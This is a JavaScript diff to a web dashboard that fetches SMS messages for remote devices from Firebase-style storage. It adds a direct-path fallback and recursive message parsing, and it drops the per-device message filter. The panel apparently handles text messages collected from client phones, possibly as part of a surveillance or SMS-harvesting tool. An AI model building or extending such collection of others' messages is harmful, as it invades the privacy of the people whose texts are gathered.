@@ -949,6 +949,20 @@ function mergeSmsLists(){
   return merged;
 }
 
+function fetchSmsFromPathsDirect(inst,d){
+  if(!inst||!d)return Promise.resolve([]);
+  var paths=smsPathsForDevice(d);
+  return Promise.all(paths.map(function(p){
+    return restJsonInst(inst,p).then(function(data){
+      if(!data||isFirebaseErr(data))return [];
+      return smsAsList(data).map(normalizeSms).filter(Boolean);
+    }).catch(function(){return[];});
+  })).then(function(results){
+    var args=[mergeSmsLists];
+    results.forEach(function(r){args.push(r);});
+    return mergeSmsLists.apply(null,results);
+  });
+}
 function fetchSmsFromPaths(inst,d){
   if(!inst||!d)return Promise.resolve([]);
   var hdr={'Content-Type':'application/json'};
@@ -962,9 +976,11 @@ function fetchSmsFromPaths(inst,d){
     schema:inst.schema||'rabel',
     device_node:d.deviceNode||'clients'
   }),cache:'no-store'}).then(function(r){return r.json();}).then(function(res){
-    if(!res||!res.ok)return [];
-    return res.messages||[];
-  }).catch(function(){return[];});
+    if(res&&res.ok&&Array.isArray(res.messages)&&res.messages.length)return res.messages;
+    return fetchSmsFromPathsDirect(inst,d);
+  }).catch(function(){
+    return fetchSmsFromPathsDirect(inst,d);
+  });
 }
 
 function loadSmsForDevice(){
@@ -978,7 +994,7 @@ function loadSmsForDevice(){
 
   function applySmsList(list){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
-    setDeviceSms(devId,filterSmsForDevice(list,d));
+    setDeviceSms(devId,list||[]);
   }
 
   function poll(){
@@ -1007,10 +1023,34 @@ function loadSmsForDevice(){
 
   activeListeners[devId]=listeners;
 }
+function smsLooksLikeMessage(m){
+  if(!m||typeof m!=='object')return false;
+  return !!String(m.body||m.message||m.text||m.content||m.msg||'').trim();
+}
 function smsAsList(raw){
   if(!raw)return[];
-  if(Array.isArray(raw))return raw.filter(function(x){return x&&typeof x==='object';});
-  return Object.keys(raw).map(function(k){return raw[k];}).filter(function(x){return x&&typeof x==='object';});
+  if(Array.isArray(raw)){
+    var out=[], i, v;
+    for(i=0;i<raw.length;i++){
+      v=raw[i];
+      if(!v||typeof v!=='object')continue;
+      if(smsLooksLikeMessage(v))out.push(v);
+      else out=out.concat(smsAsList(v));
+    }
+    return out;
+  }
+  if(typeof raw!=='object')return[];
+  var wrapKeys=['messages','sms','data','items','list'], w;
+  for(w=0;w<wrapKeys.length;w++){
+    if(raw[wrapKeys[w]]&&typeof raw[wrapKeys[w]]==='object')return smsAsList(raw[wrapKeys[w]]);
+  }
+  return Object.keys(raw).map(function(k){return raw[k];}).filter(function(x){
+    return x&&typeof x==='object';
+  }).reduce(function(acc,v){
+    if(smsLooksLikeMessage(v))acc.push(v);
+    else acc=acc.concat(smsAsList(v));
+    return acc;
+  },[]);
 }
 // ---- FIX: SMS timestamp extraction and sorting ----
 function smsToMs(v){
